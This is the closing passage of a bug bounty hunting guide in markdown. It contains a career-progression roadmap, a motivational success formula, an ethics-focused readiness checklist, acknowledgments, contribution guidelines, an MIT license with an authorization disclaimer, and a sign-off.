What to do:
→ Increase target diversity
→ Deep dive specific areas
→ Collaborate with others
→ Share your knowledge
→ Give back to community

YEAR 2+: The Mastery
====================
- Consistent high bounties
- Recognized in community
- Efficient methodology
- Deep expertise
- Mentoring others

This is where you become an expert.

What to do:
→ Push boundaries
→ Discover new techniques
→ Contribute to tools
→ Speak at conferences
→ Help next generation
```

### The Ultimate Success Formula

```
SUCCESS = (Knowledge × Persistence × Methodology) ÷ Time

Where:
------
Knowledge = What you learn
  → Read this guide
  → Study vulnerabilities
  → Understand targets
  → Learn from reports
  
Persistence = How long you continue
  → Daily practice
  → Don't quit after failures
  → Consistent effort
  → Long-term commitment
  
Methodology = How you work
  → Systematic approach
  → Documented process
  → Continuous improvement
  → Efficient workflow
  
Time = Your investment
  → Quality hours matter
  → Focused work
  → Not just "putting in time"
  → Deliberate practice

The Math:
---------
High Knowledge × Low Persistence = Wasted potential
Low Knowledge × High Persistence = Slow progress
High Both × No Methodology = Inefficient
All Three × Sufficient Time = SUCCESS

This guide gave you Knowledge.
Your Persistence is up to you.
Your Methodology you'll develop.
Time will pass either way.

Choose to invest it wisely.
```

### Final Checklist Before You Start

```
□ I understand this is a marathon, not a sprint
□ I'm committed to at least 6 months of learning
□ I have realistic expectations (not getting rich quick)
□ I will follow rules and be ethical ALWAYS
□ I will be professional in all communications
□ I will learn from failures and rejections
□ I will help others when I gain knowledge
□ I will stay updated with new techniques
□ I will practice responsible disclosure
□ I understand the legal boundaries
□ I have a learning plan
□ I have my environment set up
□ I'm ready to face challenges
□ I'm excited about the journey
□ I will never give up

If you checked all boxes, you're ready.

Welcome to bug bounty hunting.
Your journey starts now.
```

---

## 🙏 Acknowledgments

```
This guide stands on the shoulders of giants.

Thank you to:
-------------
→ All the bug bounty hunters who share knowledge
→ The platforms (HackerOne, Bugcrowd, etc.)
→ Tool developers (ProjectDiscovery, TomNomNom, etc.)
→ Companies running bug bounty programs
→ The entire security community
→ Everyone who contributes to making the internet safer

Special Thanks:
---------------
→ @NahamSec for inspiring methodology
→ @tomnomnom for amazing tools
→ @pdiscoveryio for revolutionary toolkit
→ Every hunter who published a writeup
→ Every developer who open-sourced their tools
→ Every beginner who asked questions

This guide is forever free and open source.
Share it. Improve it. Learn from it.

But most importantly:
Use it to find bugs and make the internet safer.
```

---

## 📝 Contributing to This Guide

```
Found an error? Have a suggestion? Want to add a case study?

This guide lives on GitHub and welcomes contributions!

How to contribute:
------------------
1. Fork the repository
2. Make your changes
3. Submit a pull request
4. Add yourself to contributors

What we're looking for:
-----------------------
✅ Corrections and improvements
✅ New case studies (with permission)
✅ Updated tool information
✅ Additional resources
✅ Translations
✅ Practical examples
✅ Methodology improvements

Guidelines:
-----------
→ Keep the quality high
→ Verify information is accurate
→ Respect responsible disclosure
→ Credit original sources
→ Maintain beginner-friendly tone
→ Include practical examples

Together, we can make this the best
active recon guide in existence.
```

---

## 📄 License

```
MIT License

Copyright (c) 2025 Bug Bounty Community

Permission is hereby granted, free of charge, to any person obtaining a copy
of this guide and associated documentation files, to deal in the guide without
restriction, including without limitation the rights to use, copy, modify,
merge, publish, distribute, sublicense, and/or sell copies of the guide, and
to permit persons to whom the guide is furnished to do so, subject to the
following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the guide.

THE GUIDE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE GUIDE OR THE USE OR OTHER DEALINGS IN THE
GUIDE.

DISCLAIMER:
This guide is for educational purposes only. The authors and contributors
are not responsible for any misuse of the information provided. Always obtain
proper authorization before testing any systems and follow responsible
disclosure practices.
```

---

<div align="center">

## 🚀 NOW GO HUNT!

**You have the knowledge. You have the tools. You have the methodology.**

**All that's left is ACTION.**

---

*"The best time to start was yesterday.*  
*The second best time is NOW."*

---

**Happy Hunting! 🎯**

**Stay Ethical. Stay Persistent. Stay Curious.**

---

**Made with ❤️ by the Bug Bounty Community**

**Last Updated: February 2026**

</div>

---


